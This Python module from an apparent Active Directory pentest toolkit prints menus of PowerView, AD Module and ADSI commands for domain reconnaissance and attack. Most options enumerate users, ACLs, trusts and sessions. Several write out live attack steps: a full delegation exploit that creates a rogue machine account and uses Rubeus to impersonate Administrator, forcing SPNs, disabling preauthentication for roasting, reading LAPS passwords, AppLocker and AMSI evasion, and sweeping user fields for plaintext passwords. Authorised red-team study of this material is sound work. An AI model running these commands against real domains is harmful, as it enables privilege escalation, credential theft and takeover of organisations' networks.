"""
Module: PowerView / AD Module Full Enumeration
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("POWERVIEW ENUMERATION", "Full AD Recon")
    dom  = input_or_session("domain",   "Domain")
    dc   = input_or_session("dc_ip",    "DC IP")
    user = input_or_session("username", "Username")

    print(f"""
  [1]  Domain / Forest Info
  [2]  Users, Computers, Groups
  [3]  GPO & OU Enumeration
  [4]  ACL / ACE Enumeration
  [5]  Trust Relationships
  [6]  Delegation (Unconstrained/Constrained/RBCD)
  [7]  SPN & Roastable Users
  [8]  LAPS via PowerView / LAPSToolkit
  [9]  AppLocker Policy
  [10] Find Local Admin Access (noisy)
  [11] Session Hunting (noisy)
  [12] AD Module (Microsoft RSAT)
  [13] ADSI / .NET Classes  (no PowerView, no binary — pure stealth)
  [14] Find-UserField       (search description/comment for credentials)
  [15] File Server Discovery (Get-NetFileServer)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {Y}Domain / Forest Info:{RST}
  Get-Domain
  Get-Domain -Domain {dom}
  Get-DomainSID
  Get-DomainPolicy
  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
  Get-DomainController
  Get-DomainController -Domain {dom}
  Get-ForestDomain
  Get-ForestTrust
  Get-ForestGlobalCatalog
""")

    elif c == "2":
        print(f"""
  {Y}Users:{RST}
  Get-DomainUser | select -ExpandProperty cn
  Get-DomainUser | select cn,description,memberof,pwdlastset,lastlogon
  Get-DomainUser | Out-File .\\DomainUsers.txt
  Get-DomainUser -SamAccountName {user}
  Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
  Get-DomainUser -AdminCount | select cn,memberof,description   # Privileged

  {Y}Computers:{RST}
  Get-DomainComputer
  Get-DomainComputer -Properties OperatingSystem,Name,DnsHostName | Sort-Object -Property DnsHostName
  Get-DomainComputer -Ping -Properties OperatingSystem,Name,DnsHostName

  {Y}Groups:{RST}
  Get-DomainGroup | Out-File .\\DomainGroups.txt
  Get-DomainGroup *admin* | select cn
  Get-DomainGroupMember "Domain Admins" | select -ExpandProperty membername
  Get-DomainGroupMember "Enterprise Admins" -Recurse
  Get-DomainGroup -AdminCount | select cn,memberof
""")

    elif c == "3":
        print(f"""
  {Y}GPO Enumeration:{RST}
  Get-DomainGPO
  Get-DomainGPO -ComputerIdentity <machine>
  Get-DomainGPO | select displayname,gpcfilesyspath
  Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName,GroupName,GroupMembers
  Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName,GPODisplayName,ComputerName

  {Y}Who can create/link GPOs:{RST}
  Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC={dom.replace('.', ',DC=')}" -ResolveGUIDs |
    ?{{$_.ObjectAceType -eq "Group-Policy-Container"}} | select ObjectDN,ActiveDirectoryRights,SecurityIdentifier

  Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
    ?{{$_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty"}} |
    select ObjectDN,SecurityIdentifier

  {Y}OUs:{RST}
  Get-DomainOU -FullData
  Get-DomainOU -name Servers | %{{Get-DomainComputer -SearchBase $_.distinguishedname}} | select dnshostname
""")

    elif c == "4":
        target = prompt("Target user/group") or "Domain Admins"
        print(f"""
  {Y}ACL / ACE Enumeration:{RST}

  Get-DomainObjectAcl -SamAccountName "{target}" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights

  # All interesting ACLs in domain (slow)
  Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ft

  # Filter for controlled user
  Find-InterestingDomainAcl -ResolveGUIDs | ?{{$_.IdentityReferenceName -match "{user}"}}

  {Y}Key ACE types:{RST}
  GenericAll          → Full control
  GenericWrite        → Write any non-protected attribute
  WriteDACL           → Modify ACL → escalate rights
  WriteOwner          → Take ownership
  ForceChangePassword → Reset password without knowing current
  AllExtendedRights   → DCSync, ForceChangePassword
""")

    elif c == "5":
        print(f"""
  {Y}Trust Enumeration:{RST}
  Get-DomainTrust
  Get-DomainTrust -Domain {dom}
  Get-ForestTrust
  Get-DomainForeignGroupMember -domain {dom}

  # TREAT_AS_EXTERNAL flag = SID filtering disabled (exploitable!)
  Get-DomainTrust | ?{{$_.TrustAttributes -match "TREAT_AS_EXTERNAL"}}
""")

    elif c == "6":
        print(f"""
  {Y}Unconstrained Delegation:{RST}
  Get-DomainComputer -Unconstrained | select cn,dnshostname

  {Y}Constrained Delegation:{RST}
  Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
  Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

  {Y}RBCD — exploit with PowerMad + Rubeus:{RST}
  New-MachineAccount -MachineAccount evilComp -Password $(ConvertTo-SecureString 'P4ss123!' -AsPlainText -Force)
  $sid = Get-DomainComputer -Identity evilComp -Properties objectsid | Select -Expand objectsid
  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
  $SDbytes = New-Object byte[] ($SD.BinaryLength)
  $SD.GetBinaryForm($SDbytes,0)
  Get-DomainComputer -Identity <TargetSrv> | Set-DomainObject -Set @{{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}}
  .\\Rubeus.exe s4u /user:evilComp$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:CIFS/<TargetSrv>.{dom} /ptt
""")

    elif c == "7":
        print(f"""
  {Y}Kerberoastable:{RST}
  Get-DomainUser -SPN | select name,serviceprincipalname
  Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.{dom}"

  {Y}Force set SPN (GenericWrite required):{RST}
  Set-DomainObject -Identity TargetUser -Set @{{serviceprincipalname='any/thing'}}

  {Y}AS-REP Roastable:{RST}
  Get-DomainUser -PreauthNotRequired | select name
  Set-DomainObject -Identity TargetUser -XOR @{{useraccountcontrol=4194304}}  # Force disable preauth
""")

    elif c == "8":
        print(f"""
  {Y}LAPS (PowerView):{RST}
  Get-DomainComputer -identity <machine> -properties ms-Mcs-AdmPwd
  Get-DomainComputer | ?{{$_.'ms-Mcs-AdmPwd'}} | select cn,'ms-Mcs-AdmPwd'

  {Y}LAPSToolkit:{RST}
  Get-LAPSComputers
  Find-LAPSDelegatedGroups

  {Y}CME:{RST}
  crackmapexec ldap {dc} -u '{user}' -p '<pw>' -d {dom} -M laps
""")

    elif c == "9":
        print(f"""
  {Y}AppLocker Policy:{RST}
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

  {Y}Bypass paths:{RST}
  C:\\Windows\\Tasks\\
  C:\\Windows\\Temp\\
  C:\\Windows\\tracing\\

  {Y}Techniques:{RST}
  - LOLBAS (Microsoft-signed binaries)
  - DLL wrapping → rundll32 (DLL rules often not enforced)
  - Alternate Data Stream
  - Local admin → usually not enforced
""")

    elif c == "10":
        print(f"""
  {Y}Find Local Admin Access (VERY noisy 🚩):{RST}
  Find-LocalAdminAccess
  Find-LocalAdminAccess -ComputerFile .\\computers.txt
  Find-DomainUserLocation -CheckAccess | ?{{$_.LocalAdmin -Eq True}}
  Find-DomainUserLocation -UserGroupIdentity "Domain Admins" | select UserName,SessionFromName
""")

    elif c == "11":
        print(f"""
  {Y}Session Hunting (noisy 🚩):{RST}
  Get-NetSession -ComputerName <machine>
  Get-NetLoggedon -ComputerName <machine>
  Invoke-BloodHound -CollectionMethod LoggedOn
""")

    elif c == "12":
        print(f"""
  {Y}Microsoft AD Module (stealth):{RST}
  Import-Module ActiveDirectory
  Get-ADDomain
  Get-ADForest
  Get-ADTrust -Filter *
  Get-ADUser -Filter * -Properties * | select cn,description,memberof
  Get-ADUser -Filter {{AdminCount -eq 1}} | select cn,memberof
  Get-ADComputer -Filter * -Properties OperatingSystem | select name,OperatingSystem
  Get-ADGroup -Filter * | select name
  Get-ADGroupMember "Domain Admins" -Recursive
  Get-GPO -All
  Get-GPOReport -All -ReportType HTML -Path .\\GPOReport.html
""")

    elif c == "13":
        base_dn = "DC=" + dom.replace(".", ",DC=")
        print(f"""
  {NEON_CYN}ADSI — [ADSI] accelerator (no tools needed, pure built-in){RST}

  # Get domain object
  $domain = [ADSI]"LDAP://{dom}"
  $domain | select name,distinguishedName

  # Get current user context
  $root = [ADSI]"LDAP://RootDSE"
  $root.defaultNamingContext

  # Search all users (DirectorySearcher)
  $searcher = New-Object System.DirectoryServices.DirectorySearcher
  $searcher.SearchRoot = [ADSI]"LDAP://{base_dn}"
  $searcher.Filter = "(objectClass=user)"
  $searcher.PropertiesToLoad.Add("sAMAccountName") | Out-Null
  $searcher.PropertiesToLoad.Add("description")    | Out-Null
  $searcher.FindAll() | %{{ $_.Properties.samaccountname }}

  {NEON_CYN}.NET Classes — System.DirectoryServices.ActiveDirectory{RST}

  # Get current domain
  $ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
  $ADClass::GetCurrentDomain()

  # Get domain SID
  $DomainObj   = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  $DomainSID   = (New-Object System.Security.Principal.NTAccount($DomainObj.Name)).Translate([System.Security.Principal.SecurityIdentifier]).Value

  # Get all DCs
  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

  # Get forest
  [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
  [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Domains
  [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs

  {NEON_CYN}Why use ADSI/.NET instead of PowerView?{RST}
  {DIM}• No script download required — 100% built-in Windows
  • Bypasses PowerShell AMSI scanning of external scripts
  • AD Module DLL can be Import-Module'd without RSAT installed
  • Useful in heavily-locked CLM environments{RST}
""")

    elif c == "14":
        field   = prompt("Field to search (e.g. Description, info, comment)") or "Description"
        keyword = prompt("Keyword to search for (e.g. pass, pwd, cred, built)") or "pass"
        print(f"""
  {NEON_CYN}Find-UserField — search user attributes for credentials{RST}

  # PowerView
  Find-UserField -SearchField {field} -SearchTerm "{keyword}"

  # AD Module equivalent
  Get-ADUser -Filter '{field} -like "*{keyword}*"' -Properties {field} | select Name,{field}

  # LDAP search
  Get-DomainUser -LDAPFilter "({field}=*{keyword}*)" | select name,{field}

  {NEON_CYN}Common credential fields to check:{RST}
  {DIM}Description   — often has temp passwords set by helpdesk
  info          — free-text field, sometimes has creds
  comment       — legacy field
  userParameters — sometimes abused
  extensionAttribute1-15 — custom org fields{RST}

  {NEON_CYN}Sweep all attributes at once:{RST}
  $fields = @('Description','info','comment','userParameters')
  foreach ($f in $fields) {{
      Get-DomainUser -LDAPFilter "($f=*pass*)" | select name,$f
      Get-DomainUser -LDAPFilter "($f=*pwd*)"  | select name,$f
  }}

  {NEON_CYN}Also check computers:{RST}
  Find-UserField -SearchField Description -SearchTerm "{keyword}" -ObjectClass computer
  Get-ADComputer -Filter 'Description -like "*{keyword}*"' -Properties Description | select Name,Description
""")
        add_finding(
            "Credential in User Description Field",
            "High",
            f"Searched '{field}' attribute for keyword '{keyword}' — review results for plaintext credentials",
            "Audit and clear sensitive data from AD user/computer description fields",
        )

    elif c == "15":
        print(f"""
  {NEON_CYN}File Server Discovery — Get-NetFileServer{RST}
  {DIM}(CRTP key technique: used as stealth user-hunting targets){RST}

  # Find all file servers in domain
  Get-NetFileServer
  Get-NetFileServer -Domain {dom}

  # How it works:
  {DIM}Queries users' homeDirectory, scriptPath, profilePath attributes
  → extracts the server name from UNC paths
  → these are machines users actively authenticate to{RST}

  # Why it matters:
  {DIM}• Domain Admins often have sessions on file servers
  • Natural high-traffic → your auth blends in
  • Used by Invoke-UserHunter -Stealth{RST}

  # Enumerate via LDAP directly
  Get-DomainUser -Properties homeDirectory,scriptPath,profilePath |
    ?{{$_.homeDirectory}} |
    %{{([uri]$_.homeDirectory).Host}} |
    Sort-Object -Unique

  # Combine with user hunting
  $fs = Get-NetFileServer
  Invoke-UserHunter -ComputerName $fs -GroupName "Domain Admins" -CheckAccess
""")

    pause()
